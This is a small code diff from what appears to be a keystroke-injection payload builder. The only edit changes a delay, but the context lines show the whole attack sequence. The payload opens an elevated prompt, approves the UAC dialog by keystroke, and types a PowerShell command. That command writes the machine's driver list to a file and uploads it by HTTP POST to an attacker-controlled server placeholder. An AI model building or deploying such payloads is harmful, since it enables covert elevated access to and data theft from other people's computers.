@@ -209,7 +209,7 @@ class PayloadBuilder:
                 {'action': 'combo', 'keys': ['CTRL', 'SHIFT', 'ENTER']},
                 {'action': 'delay', 'ms': 1500},
                 {'action': 'combo', 'keys': ['ALT', 'y']},
-                {'action': 'delay', 'ms': 1000},
+                {'action': 'delay', 'ms': 2000},
                 {'action': 'type', 'text': 'pnputil /enum-drivers>C:\\drivers.txt;Invoke-WebRequest -Uri "http://{{SERVER_IP}}:8000" -Method POST -InFile C:\\drivers.txt -Headers @{"X-Filename"="drivers.txt"} -UseBasicParsing'},
                 {'action': 'key', 'name': 'ENTER'},
                 {'action': 'delay', 'ms': 3000},
